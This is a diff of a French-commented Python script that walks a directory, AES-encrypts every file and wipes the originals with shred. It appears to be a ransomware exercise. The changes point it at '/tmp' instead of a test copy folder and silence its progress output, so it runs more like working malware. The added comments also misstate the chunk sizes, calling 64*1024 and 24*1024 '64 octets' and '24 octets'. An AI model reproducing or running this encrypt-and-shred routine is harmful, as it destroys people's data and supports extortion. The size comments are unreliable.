@@ -7,13 +7,14 @@ import requests
 import sys
 import subprocess
 
-def encryptFile(key, filename, out_filename=None, chunksize=64+1024):
+def encryptFile(key, filename, out_filename=None, chunksize=64*1024):
     '''
     Chiffre un fichier en utilisant l'algorithme AES-256
     key : clé utilisé pour le chiffrement
     filename : le fichier qu'on souhaite chiffrer
     out_filename : le fichier chiffré
-    chunksize : taille de bloc que la fonction va lire
+    chunksize : taille de bloc que la fonction va lire, ici on prend des morceaux de 64 octets,
+    		ce système permet de chiffrer des fichiers volumineux sans saturer la RAM. 
     '''
 
     if not out_filename:
@@ -46,7 +47,7 @@ def decryptFile(key, filename, out_filename=None, chunksize=24*1024):
     key : clé utilisé pour déchiffrer
     filename : le fichier qu'on souhaite déchiffrer
     out_filename : le fichier déchiffré
-    chunksize : taille de bloc que la fonction va lire
+    chunksize : taille de bloc que la fonction va lire, ici 24 octets
     '''
 
     if not out_filename:
@@ -77,7 +78,7 @@ def main(argv):
     key= key.encode('utf-8')
 
     # a changer en /tmp
-    directory = './copie'
+    directory = '/tmp'
 
     is_decrypt = None
 
@@ -90,12 +91,12 @@ def main(argv):
     for root, dirs, files in os.walk(directory, topdown=False):
        for name in files:
             file = os.path.join(root, name)
-            print(file)
+            #print(file)
 
             # déchiffrement
             if is_decrypt:
                 if file[-4:] == ".enc":
-                    print("[*] Decrypting... ")
+                    #print("[*] Decrypting... ")
                     decryptFile(key, file)
 	                #utilisation de commande bash shred pour supprimer de manière sécurisé les fichiers .enc
                     subprocess.check_output(["shred", "-uz", file])
@@ -103,7 +104,7 @@ def main(argv):
             # chiffrement
             else:
                 if file[-4:] != ".enc":
-                    print("[*] Encrypting... ")
+                    #print("[*] Encrypting... ")
                     encryptFile(key, file)
                     #utilisation de commande bash shred pour supprimer de manière sécurisé les fichiers d'origine
                     subprocess.check_output(["shred", "-uz", file])
